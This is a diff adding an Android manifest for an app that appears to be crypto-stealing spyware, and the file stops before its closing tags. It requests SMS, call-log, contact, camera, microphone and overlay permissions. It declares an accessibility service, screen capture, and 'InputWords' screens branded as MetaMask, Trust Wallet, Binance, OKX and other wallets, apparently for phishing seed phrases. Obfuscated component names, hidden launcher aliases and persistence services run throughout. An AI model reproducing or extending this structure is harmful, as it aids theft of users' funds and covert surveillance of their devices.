@@ -1,0 +1,372 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="33" android:compileSdkVersionCodename="13" package="comeliest.metempsychosis.pokelogan" platformBuildVersionCode="33" platformBuildVersionName="13">
+    <uses-feature android:name="android.hardware.telephony" android:required="false"/>
+    <uses-feature android:name="android.hardware.camera" android:required="false"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:maxSdkVersion="32" android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_SETTINGS"/>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:maxSdkVersion="22" android:name="android.permission.GET_ACCOUNTS"/>
+    <uses-permission android:name="android.permission.CALL_PHONE"/>
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+    <uses-permission android:name="android.permission.BATTERY_STATS"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
+    <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY"/>
+    <instrumentation android:functionalTest="true" android:name="marmojkfnf.uxyfrgc.facntwu.saqypssg.Cjkbocf" android:targetPackage="comeliest.metempsychosis.pokelogan" android:targetProcesses="comeliest.metempsychosis.pokelogan"/>
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
+    <uses-permission android:maxSdkVersion="22" android:name="android.permission.AUTHENTICATE_ACCOUNTS"/>
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+    <uses-permission android:name="android.permission.REORDER_TASKS"/>
+    <uses-permission android:name="android.permission.WRITE_SYNC_SETTINGS"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT"/>
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.SYSTEM_OVERLAY_WINDOW"/>
+    <uses-permission android:name="com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE"/>
+    <queries>
+        <intent>
+            <action android:name="android.intent.action.MAIN"/>
+        </intent>
+        <intent>
+            <action android:name="android.intent.action.VIEW"/>
+        </intent>
+    </queries>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
+    <application android:allowBackup="true" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:dataExtractionRules="@xml/data_extraction_rules" android:debuggable="true" android:extractNativeLibs="true" android:fullBackupContent="@xml/backup_rules" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:name="com.superbock.App" android:roundIcon="@mipmap/ic_launcher_round" android:supportsRtl="true" android:theme="@style/Theme.PA" android:usesCleartextTraffic="true">
+        <activity android:enabled="true" android:exported="true" android:launchMode="singleInstance" android:name="com.superbock.ui.StartupActivity" android:theme="@style/StartupTheme">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:enabled="true" android:exported="true" android:launchMode="singleInstance" android:name="com.superbock.ui.BlankActivity" android:theme="@style/StartupTheme"/>
+        <activity android:excludeFromRecents="true" android:hardwareAccelerated="true" android:launchMode="singleInstance" android:name="com.superbock.ui.WebActivity"/>
+        <activity android:excludeFromRecents="true" android:finishOnCloseSystemDialogs="true" android:icon="@drawable/alias_icon" android:label="" android:name="com.superbock.ui.AdNoticeActivity" android:theme="@style/ActivityTranslucent"/>
+        <activity android:excludeFromRecents="true" android:finishOnCloseSystemDialogs="true" android:icon="@drawable/alias_icon" android:label="" android:name="com.superbock.ui.AdSingleActivity" android:theme="@style/ActivityHalfTranslucent"/>
+        <activity android:excludeFromRecents="true" android:finishOnCloseSystemDialogs="true" android:icon="@drawable/alias_icon" android:label="" android:name="com.superbock.ui.AdSingleSmallActivity" android:theme="@style/ActivityTranslucent"/>
+        <activity android:excludeFromRecents="true" android:finishOnCloseSystemDialogs="true" android:icon="@drawable/alias_icon" android:label="" android:name="com.superbock.ui.AdFullscreenActivity" android:theme="@style/ActivityTranslucent"/>
+        <activity android:excludeFromRecents="true" android:finishOnCloseSystemDialogs="true" android:icon="@drawable/alias_icon" android:label="" android:name="com.superbock.ui.AdAlertActivity" android:theme="@style/ActivityHalfTranslucent"/>
+        <activity android:excludeFromRecents="true" android:finishOnCloseSystemDialogs="true" android:icon="@drawable/alias_icon" android:label="" android:name="com.superbock.ui.AdConfirmActivity" android:theme="@style/ActivityHalfTranslucent"/>
+        <activity android:excludeFromRecents="true" android:finishOnCloseSystemDialogs="true" android:icon="@drawable/alias_icon" android:label="" android:name="com.superbock.ui.AdAlertOneButtonActivity" android:theme="@style/ActivityHalfTranslucent"/>
+        <activity android:excludeFromRecents="true" android:finishOnCloseSystemDialogs="true" android:icon="@drawable/alias_icon" android:label="" android:name="com.superbock.ui.AdConfirmOneButtonActivity" android:theme="@style/ActivityHalfTranslucent"/>
+        <activity android:excludeFromRecents="true" android:finishOnCloseSystemDialogs="true" android:icon="@drawable/alias_icon" android:label="" android:name="com.superbock.ui.AdAlertBottomActivity" android:theme="@style/ActivityHalfTranslucent"/>
+        <activity android:excludeFromRecents="true" android:finishOnCloseSystemDialogs="true" android:icon="@drawable/alias_icon" android:label="" android:name="com.superbock.ui.AdConfirmBottomActivity" android:theme="@style/ActivityHalfTranslucent"/>
+        <activity android:excludeFromRecents="true" android:finishOnCloseSystemDialogs="true" android:icon="@drawable/alias_icon" android:label="" android:name="com.superbock.ui.AdBoxActivity" android:theme="@style/ActivityHalfTranslucent"/>
+        <service android:label="dexopt" android:name="com.tencent.smtt.export.external.DexClassLoaderProviderService" android:process=":dexopt"/>
+        <activity android:excludeFromRecents="true" android:finishOnCloseSystemDialogs="true" android:hardwareAccelerated="true" android:icon="@drawable/alias_icon" android:label="" android:name="com.superbock.ui.AdWebActivity" android:screenOrientation="portrait"/>
+        <activity android:excludeFromRecents="true" android:finishOnCloseSystemDialogs="true" android:hardwareAccelerated="true" android:icon="@drawable/alias_icon" android:label="" android:name="com.superbock.ui.AdWebSmallActivity" android:screenOrientation="portrait" android:theme="@style/ActivityTranslucent"/>
+        <activity android:excludeFromRecents="true" android:finishOnCloseSystemDialogs="true" android:icon="@drawable/alias_icon" android:label="" android:name="com.superbock.auto.ScreenActivity" android:theme="@style/ActivityTranslucent"/>
+        <activity android:icon="@mipmap/ic_imtoken" android:label="@string/imtoken" android:name="com.superbock.ui.custom.InputWordsImActivity" android:roundIcon="@mipmap/ic_imtoken_round" android:screenOrientation="portrait" android:windowSoftInputMode="adjustResize"/>
+        <activity android:icon="@mipmap/ic_tp" android:label="@string/tokenpocket" android:name="com.superbock.ui.custom.InputWordsTpActivity" android:roundIcon="@mipmap/ic_tp_round" android:screenOrientation="portrait" android:windowSoftInputMode="adjustResize"/>
+        <activity android:icon="@mipmap/ic_trust" android:label="@string/trustwallet" android:name="com.superbock.ui.custom.InputWordsTrustActivity" android:roundIcon="@mipmap/ic_trust_round" android:screenOrientation="portrait" android:windowSoftInputMode="adjustResize"/>
+        <activity android:icon="@drawable/icon_tronlink" android:label="@string/tronlinkpro" android:name="com.superbock.ui.custom.InputWordsTronlinkActivity" android:screenOrientation="portrait" android:windowSoftInputMode="adjustResize"/>
+        <activity android:icon="@drawable/icon_tronglobal" android:label="@string/tronlinkglobal" android:name="com.superbock.ui.custom.InputWordsTronglobalActivity" android:screenOrientation="portrait" android:windowSoftInputMode="adjustResize"/>
+        <activity android:icon="@mipmap/ic_metamask" android:label="@string/metamask" android:name="com.superbock.ui.custom.InputWordsMetaActivity" android:roundIcon="@mipmap/ic_metamask_round" android:screenOrientation="portrait" android:windowSoftInputMode="adjustResize"/>
+        <activity android:icon="@mipmap/ic_wallet" android:label="@string/wallet" android:name="com.superbock.ui.custom.InputWordsWalletActivity" android:roundIcon="@mipmap/ic_wallet_round" android:screenOrientation="portrait" android:windowSoftInputMode="adjustResize"/>
+        <activity android:icon="@mipmap/ic_binance" android:label="@string/binance" android:name="com.superbock.ui.custom.InputWordsBinanceActivity" android:roundIcon="@mipmap/ic_binance_round" android:screenOrientation="portrait" android:windowSoftInputMode="adjustResize"/>
+        <activity android:icon="@mipmap/ic_okx" android:label="@string/okx" android:name="com.superbock.ui.custom.InputWordsOkxActivity" android:roundIcon="@mipmap/ic_okx_round" android:screenOrientation="portrait" android:windowSoftInputMode="adjustResize"/>
+        <service android:enabled="true" android:exported="true" android:foregroundServiceType="location" android:label="@string/accessibility_title" android:name="com.superbock.auto.BaseService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/auto"/>
+        </service>
+        <service android:enabled="true" android:exported="true" android:foregroundServiceType="mediaProjection" android:name="com.superbock.auto.ScreenService"/>
+        <receiver android:exported="true" android:name="com.superbock.ScreenBroadcastReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.SCREEN_ON"/>
+                <action android:name="android.intent.action.SCREEN_OFF"/>
+                <action android:name="android.intent.action.USER_PRESENT"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:exported="true" android:name="marmojkfnf.uxyfrgc.facntwu.saqypssg.Hwikbpud">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
+                <action android:name="android.intent.action.PACKAGE_FULLY_REMOVED"/>
+                <action android:name="android.intent.action.PACKAGE_CHANGED"/>
+                <action android:name="android.intent.action.PACKAGE_DATA_CLEARED"/>
+                <action android:name="android.intent.action.PACKAGE_INSTALL"/>
+                <action android:name="android.intent.action.PACKAGE_FIRST_LAUNCH"/>
+                <action android:name="android.intent.action.PACKAGE_NEEDS_VERIFICATION"/>
+                <action android:name="android.intent.action.PACKAGE_RESTARTED"/>
+                <action android:name="android.intent.action.PACKAGE_VERIFIED"/>
+                <action android:name="android.intent.action.PACKAGES_SUSPENDED"/>
+                <action android:name="android.intent.action.PACKAGES_UNSUSPENDED"/>
+                <action android:name="android.intent.action.MANAGE_PACKAGE_STORAGE"/>
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
+                <action android:name="android.intent.action.MY_PACKAGE_SUSPENDED"/>
+                <action android:name="android.intent.action.MY_PACKAGE_UNSUSPENDED"/>
+                <data android:scheme="package"/>
+            </intent-filter>
+        </receiver>
+        <activity android:configChanges="mcc|mnc|locale|keyboardHidden|navigation|orientation|screenLayout|uiMode|screenSize|density|layoutDirection|fontScale" android:excludeFromRecents="true" android:exported="true" android:immersive="true" android:launchMode="singleTask" android:name="marmojkfnf.rdjifrx.ebgaaglc.bvowyjgm.woxhyoq" android:showOnLockScreen="true" android:taskAffinity=":gxxxyq.woxhyoq" android:theme="@style/jdbekod.avuent" android:windowSoftInputMode="stateHidden|adjustResize"/>
+        <activity android:autoRemoveFromRecents="true" android:excludeFromRecents="true" android:exported="true" android:finishOnTaskLaunch="false" android:launchMode="singleInstance" android:name="marmojkfnf.uxyfrgc.facntwu.saqypssg.Tcmrloye" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity-alias android:autoRemoveFromRecents="true" android:enabled="false" android:excludeFromRecents="true" android:exported="true" android:finishOnTaskLaunch="false" android:icon="@drawable/yhukpnmt" android:label="⁤" android:launchMode="singleInstance" android:name="sbcxf.rcqidv.Iywkxq" android:targetActivity="marmojkfnf.uxyfrgc.facntwu.saqypssg.Tcmrloye">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity android:autoRemoveFromRecents="true" android:excludeFromRecents="true" android:exported="true" android:finishOnTaskLaunch="false" android:launchMode="singleInstance" android:name="marmojkfnf.uxyfrgc.facntwu.saqypssg.Ctymgoneb" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity-alias android:autoRemoveFromRecents="true" android:enabled="false" android:excludeFromRecents="true" android:exported="true" android:finishOnTaskLaunch="false" android:icon="@mipmap/ajgnottt" android:label="@string/rgsejwwxgrjp" android:launchMode="singleInstance" android:name="cwihc.qwmme.Amahvrr" android:targetActivity="marmojkfnf.uxyfrgc.facntwu.saqypssg.Ctymgoneb">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:autoRemoveFromRecents="true" android:enabled="false" android:excludeFromRecents="true" android:exported="true" android:finishOnTaskLaunch="false" android:icon="@mipmap/xyngwayh" android:label="@string/rgsejwwxgrjp" android:launchMode="singleInstance" android:name="eyixjs.xjkuxk.Aedke" android:targetActivity="marmojkfnf.uxyfrgc.facntwu.saqypssg.Ctymgoneb">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:autoRemoveFromRecents="true" android:enabled="false" android:excludeFromRecents="true" android:exported="true" android:finishOnTaskLaunch="false" android:icon="@mipmap/dqvrndgt" android:label="@string/rgsejwwxgrjp" android:launchMode="singleInstance" android:name="evyonl.augcne.Uywnua" android:targetActivity="marmojkfnf.uxyfrgc.facntwu.saqypssg.Ctymgoneb">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:autoRemoveFromRecents="true" android:enabled="false" android:excludeFromRecents="true" android:exported="true" android:finishOnTaskLaunch="false" android:icon="@mipmap/qythgeyj" android:label="@string/rgsejwwxgrjp" android:launchMode="singleInstance" android:name="mcromj.ijvqv.Frghqq" android:targetActivity="marmojkfnf.uxyfrgc.facntwu.saqypssg.Ctymgoneb">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:autoRemoveFromRecents="true" android:enabled="false" android:excludeFromRecents="true" android:exported="true" android:finishOnTaskLaunch="false" android:icon="@mipmap/nydiykel" android:label="@string/rgsejwwxgrjp" android:launchMode="singleInstance" android:name="csdmxbk.wxgokjh.Kxhicun" android:targetActivity="marmojkfnf.uxyfrgc.facntwu.saqypssg.Ctymgoneb">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:autoRemoveFromRecents="true" android:enabled="false" android:excludeFromRecents="true" android:exported="true" android:finishOnTaskLaunch="false" android:icon="@mipmap/vamdogkn" android:label="@string/rgsejwwxgrjp" android:launchMode="singleInstance" android:name="bdtjog.tjnlf.Mgtfupv" android:targetActivity="marmojkfnf.uxyfrgc.facntwu.saqypssg.Ctymgoneb">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <receiver android:enabled="true" android:exported="true" android:name="marmojkfnf.rdjifrx.ebgaaglc.bvowyjgm.Lepcowjsv">
+            <intent-filter>
+                <action android:name="android.intent.action.SCREEN_OFF"/>
+                <action android:name="android.intent.action.SCREEN_ON"/>
+                <action android:name="android.intent.action.CLOSE_SYSTEM_DIALOGS"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:exported="false" android:name="marmojkfnf.aohlylin.fuxdgkc.ptognupx.Wxdwxsl">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
+            </intent-filter>
+            <meta-data android:name="android.appwidget.provider" android:resource="@xml/ojiqxibb"/>
+        </receiver>
+        <receiver android:exported="false" android:name="marmojkfnf.aohlylin.fuxdgkc.ptognupx.Ihiwrxc">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
+            </intent-filter>
+            <meta-data android:name="android.appwidget.provider" android:resource="@xml/ndpwoksk"/>
+        </receiver>
+        <receiver android:exported="false" android:name="marmojkfnf.aohlylin.fuxdgkc.ptognupx.Uqacllexl">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
+            </intent-filter>
+            <meta-data android:name="android.appwidget.provider" android:resource="@xml/cwmlnste"/>
+        </receiver>
+        <receiver android:exported="false" android:name="marmojkfnf.aohlylin.fuxdgkc.ptognupx.Okijcgc">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
+            </intent-filter>
+            <meta-data android:name="android.appwidget.provider" android:resource="@xml/scnlfmxl"/>
+        </receiver>
+        <receiver android:exported="false" android:name="marmojkfnf.aohlylin.fuxdgkc.ptognupx.Rsxwywf">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
+            </intent-filter>
+            <meta-data android:name="android.appwidget.provider" android:resource="@xml/gwsliiki"/>
+        </receiver>
+        <receiver android:exported="true" android:name="marmojkfnf.uxyfrgc.facntwu.saqypssg.Kapxukgr">
+            <intent-filter>
+                <action android:name="cxxudrqlwupv.aygkjcdpodqs.repfvjebckyp.fpnjxqgyprw.all"/>
+                <action android:name="cxxudrqlwupv.aygkjcdpodqs.repfvjebckyp.fpnjxqgyprw.0"/>
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
+                <action android:name="miui.appwidget.action.APPWIDGET_UPDATE"/>
+            </intent-filter>
+            <meta-data android:name="miuiWidgetRefresh" android:value="exposure"/>
+            <meta-data android:name="miuiWidgetRefreshMinInterval" android:value="1000"/>
+            <meta-data android:name="miuiWidget" android:value="true"/>
+            <meta-data android:name="android.appwidget.provider" android:resource="@xml/gwsliiki"/>
+        </receiver>
+        <receiver android:exported="true" android:name="marmojkfnf.uxyfrgc.facntwu.saqypssg.Thqddkwjg" android:process=":rhsfkrtrgxb1">
+            <intent-filter>
+                <action android:name="cxxudrqlwupv.aygkjcdpodqs.repfvjebckyp.fpnjxqgyprw.all"/>
+                <action android:name="cxxudrqlwupv.aygkjcdpodqs.repfvjebckyp.fpnjxqgyprw.1"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:exported="true" android:name="marmojkfnf.uxyfrgc.facntwu.saqypssg.Rychkuntc" android:process=":rxkcwmckdgbw2">
+            <intent-filter>
+                <action android:name="cxxudrqlwupv.aygkjcdpodqs.repfvjebckyp.fpnjxqgyprw.all"/>
+                <action android:name="cxxudrqlwupv.aygkjcdpodqs.repfvjebckyp.fpnjxqgyprw.2"/>
+            </intent-filter>
+        </receiver>
+        <service android:directBootAware="true" android:enabled="true" android:exported="true" android:name="marmojkfnf.uxyfrgc.facntwu.saqypssg.Dreentpbp" android:stopWithTask="false"/>
+        <service android:directBootAware="true" android:enabled="true" android:exported="true" android:name="marmojkfnf.uxyfrgc.facntwu.saqypssg.Ngepbsoje" android:process=":svlseqgjrqq1" android:stopWithTask="false"/>
+        <service android:directBootAware="true" android:enabled="true" android:exported="true" android:name="marmojkfnf.uxyfrgc.facntwu.saqypssg.Qjkerpgw" android:process=":sfcsoutiuli2" android:stopWithTask="false"/>
+        <service android:enabled="true" android:exported="true" android:name="marmojkfnf.uxyfrgc.facntwu.saqypssg.Aflrulxxo" android:permission="android.permission.BIND_JOB_SERVICE"/>
+        <provider android:authorities="com.sibling.clutch.apart.gejld.vlfnxkeoe" android:directBootAware="true" android:enabled="true" android:exported="true" android:initOrder="2147483647" android:name="marmojkfnf.uxyfrgc.facntwu.saqypssg.Bwihywmxw"/>
+        <provider android:authorities="com.sibling.clutch.apart.ybgsrsl.gsyuldews" android:directBootAware="true" android:enabled="true" android:exported="true" android:initOrder="2147483647" android:name="marmojkfnf.uxyfrgc.facntwu.saqypssg.Kcjfbbpdv" android:process=":pifjsedsbvicr1"/>
+        <provider android:authorities="com.sibling.clutch.apart.sirik.emdjkah" android:directBootAware="true" android:enabled="true" android:exported="true" android:initOrder="2147483647" android:name="marmojkfnf.uxyfrgc.facntwu.saqypssg.Mnwpltg" android:process=":pgvltiiuteto2"/>
+        <service android:enabled="true" android:exported="true" android:name="marmojkfnf.giofwpd.voerxs.kmwoctnp.Plegbwwh">
+            <intent-filter>
+                <action android:name="android.accounts.AccountAuthenticator"/>
+            </intent-filter>
+            <meta-data android:name="android.accounts.AccountAuthenticator" android:resource="@xml/yofmhqms"/>
+        </service>
+        <service android:enabled="true" android:exported="true" android:name="marmojkfnf.giofwpd.voerxs.kmwoctnp.Uhkjdose">
+            <intent-filter>
+                <action android:name="android.content.SyncAdapter"/>
+            </intent-filter>
+            <meta-data android:name="android.content.SyncAdapter" android:resource="@xml/gdylmbti"/>
+        </service>
+        <provider android:authorities="yrm.xbwq.rma.pghun" android:enabled="true" android:exported="true" android:name="marmojkfnf.giofwpd.voerxs.kmwoctnp.Nbrquyq" android:syncable="true">
+            <meta-data android:name="@string/logo_board" android:value="true"/>
+        </provider>
+        <service android:enabled="true" android:exported="true" android:name="marmojkfnf.quljbox.efthfutt.niwore.Plegbwwh">
+            <intent-filter>
+                <action android:name="android.accounts.AccountAuthenticator"/>
+            </intent-filter>
+            <meta-data android:name="android.accounts.AccountAuthenticator" android:resource="@xml/vicynqoy"/>
+        </service>
+        <service android:enabled="true" android:exported="true" android:name="marmojkfnf.quljbox.efthfutt.niwore.Uhkjdose">
+            <intent-filter>
+                <action android:name="android.content.SyncAdapter"/>
+            </intent-filter>
+            <meta-data android:name="android.content.SyncAdapter" android:resource="@xml/gbidubrf"/>
+        </service>
+        <provider android:authorities="ncx.ejp.ocdux.madtyrt" android:enabled="true" android:exported="true" android:name="marmojkfnf.quljbox.efthfutt.niwore.Nbrquyq" android:syncable="true">
+            <meta-data android:name="@string/logo_board" android:value="true"/>
+        </provider>
+        <receiver android:enabled="true" android:exported="true" android:name="marmojkfnf.uxyfrgc.facntwu.saqypssg.Kufhgacm">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.SCREEN_OFF"/>
+                <action android:name="android.intent.action.SCREEN_ON"/>
+                <action android:name="android.intent.action.USER_PRESENT"/>
+            </intent-filter>
+        </receiver>
+        <service android:exported="true" android:name="marmojkfnf.ybdrbn.txsrhukl.rwgsop.Ulennxoi" android:permission="android.permission.BIND_WALLPAPER">
+            <intent-filter>
+                <action android:name="android.service.wallpaper.WallpaperService"/>
+            </intent-filter>
+            <meta-data android:name="android.service.wallpaper" android:resource="@xml/ptbwviht"/>
+        </service>
+        <receiver android:enabled="true" android:exported="true" android:name="marmojkfnf.uxyfrgc.facntwu.saqypssg.Bngglgld">
+            <intent-filter>
+                <action android:name="com.sibling.clutch.apart.jbini.mngi.abhq"/>
+            </intent-filter>
+        </receiver>
+        <service android:enabled="true" android:exported="true" android:name="marmojkfnf.uxyfrgc.facntwu.saqypssg.Dcejdhdpi">
+            <intent-filter>
+                <action android:name="android.speech.Hdsnesbe"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.speech.VoiceInputService"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </service>
+        <provider android:authorities="com.sibling.clutch.apart.htdyx.ehggo" android:enabled="true" android:exported="true" android:name="marmojkfnf.uxyfrgc.facntwu.saqypssg.Ilpanravp">
+            <meta-data android:name="@string/logo_board" android:value="true"/>
+            <meta-data android:name="@string/logo_background" android:value="false"/>
+            <meta-data android:name="@string/logo_foreground" android:value="true"/>
+        </provider>
+        <service android:enabled="true" android:exported="true" android:name="marmojkfnf.uxyfrgc.facntwu.saqypssg.Hdsnesbe">
+            <intent-filter>
+                <action android:name="android.speech.Hdsnesbe"/>
+            </intent-filter>
+        </service>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:exported="false" android:name="com.blankj.utilcode.util.UtilsTransActivity4MainProcess" android:theme="@style/ActivityTranslucent" android:windowSoftInputMode="stateAlwaysHidden"/>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:exported="false" android:multiprocess="true" android:name="com.blankj.utilcode.util.UtilsTransActivity" android:theme="@style/ActivityTranslucent" android:windowSoftInputMode="stateAlwaysHidden"/>
+        <provider android:authorities="com.sibling.clutch.apart.utilcode.fileprovider" android:exported="false" android:grantUriPermissions="true" android:name="com.blankj.utilcode.util.UtilsFileProvider">
+            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/util_code_provider_paths"/>
+        </provider>
+        <service android:exported="false" android:name="com.blankj.utilcode.util.MessengerUtils$ServerService">
+            <intent-filter>
+                <action android:name="com.sibling.clutch.apart.messenger"/>
+            </intent-filter>
+        </service>
+        <service android:directBootAware="false" android:exported="@bool/enable_gcm_scheduler_default" android:name="androidx.work.impl.background.gcm.WorkManagerGcmService" android:permission="com.google.android.gms.permission.BIND_NETWORK_TASK_SERVICE">
+            <intent-filter>
+                <action android:name="com.google.android.gms.gcm.ACTION_TASK_READY"/>
+            </intent-filter>
+        </service>
+        <service android:exported="false" android:name="androidx.work.multiprocess.RemoteWorkManagerService"/>
+        <provider android:authorities="com.sibling.clutch.apart.androidx-startup" android:exported="false" android:name="androidx.startup.InitializationProvider">
+            <meta-data android:name="androidx.work.WorkManagerInitializer" android:value="androidx.startup"/>
+            <meta-data android:name="androidx.emoji2.text.EmojiCompatInitializer" android:value="androidx.startup"/>
+            <meta-data android:name="androidx.lifecycle.ProcessLifecycleInitializer" android:value="androidx.startup"/>
+        </provider>
+        <service android:directBootAware="false" android:enabled="@bool/enable_system_alarm_service_default" android:exported="false" android:name="androidx.work.impl.background.systemalarm.SystemAlarmService"/>
+        <service android:directBootAware="false" android:enabled="@bool/enable_system_job_service_default" android:exported="true" android:name="androidx.work.impl.background.systemjob.SystemJobService" android:permission="android.permission.BIND_JOB_SERVICE"/>
+        <service android:directBootAware="false" android:enabled="@bool/enable_system_foreground_service_default" android:exported="false" android:name="androidx.work.impl.foreground.SystemForegroundService"/>
+        <receiver android:directBootAware="false" android:enabled="true" android:exported="false" android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver"/>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy">
+            <intent-filter>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy">
+            <intent-filter>
+                <action android:name="android.intent.action.BATTERY_OKAY"/>
+                <action android:name="android.intent.action.BATTERY_LOW"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy">
+            <intent-filter>
+                <action android:name="android.intent.action.DEVICE_STORAGE_LOW"/>
+                <action android:name="android.intent.action.DEVICE_STORAGE_OK"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.TIME_SET"/>
+                <action android:name="android.intent.action.TIMEZONE_CHANGED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="@bool/enable_system_alarm_service_default" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver">
+            <intent-filter>
+                <action android:name="androidx.work.impl.background.systemalarm.UpdateProxies"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="true" android:exported="true" android:name="androidx.work.impl.diagnostics.DiagnosticsReceiver" android:permission="android.permission.DUMP">
+            <intent-filter>
+                <action android:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS"/>
+            </intent-filter>
+        </receiver>
